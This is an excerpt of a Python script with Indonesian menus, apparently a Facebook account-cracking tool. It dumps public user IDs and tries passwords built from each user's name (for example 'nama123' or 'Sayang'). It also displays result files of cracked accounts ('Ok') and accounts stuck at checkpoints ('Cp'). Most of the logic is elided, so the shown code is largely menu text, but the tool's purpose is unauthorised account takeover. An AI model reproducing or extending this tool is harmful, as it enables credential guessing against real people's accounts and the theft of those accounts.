...
def ___menu___():
    ...
    print("\n%s[%s1%s]%s Dump ID Publik Old (2004-2021)"%(H,U,H,P))
    ...
    print("%s[%s7%s]%s Dump ID Publik Id (2021-2004)"%(H,U,H,P))
    ...
    if ___menu___ in ['1','01']:
        ...
        if ___hasilz___ in ['1','01']:
            try:
                ...
                exit("%s[%s!%s]%s Máhdi Ok.txt Tidak Ada"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Ok.txt')
            print("\n%s[%s*%s]%s Total MAHDI Ok.txt :%s %s"%(B,P,B,P,H,len(open('Results/Ok.txt','r').readlines())))
        elif ___hasilz___ in ['2','02']:
            try:
                ___cp___ = open('Results/Cp.txt','r').read()
            except (IOError):
                exit("%s[%s!%s]%s MAHDI Cp.txt Tidak Ada"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Cp.txt')
            print("\n%s[%s*%s]%s Total MAHDI Cp.txt :%s %s"%(B,P,B,P,H,len(open('Results/Cp.txt','r').readlines())))
        ...
        os.system("xdg-open https://web.facebook.com/mahdi80808/?text=Hallo%20Bang%20Rozhak")
        exit()
...
def ___metode___():
    ...
    if ___metode___ in ['1','01']:
        ...
        print("\n%s[%s1%s]%s Gunakan Password [nama,nama123,nama12345,nama121,nama1122]"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,nama123456]"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,Sayang,Dll]"%(H,P,H,P))
        print("%s[%s4%s]%s Gunakan Password Manual [ >6 ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        ...
        print("\n%s[%s1%s]%s Gunakan Password [nama,nama123,nama121,nama1122,nama12345]"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,nama123456]"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,Sayang,Dll]"%(H,P,H,P))
        print("%s[%s4%s]%s Gunakan Password Manual [ >6 ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
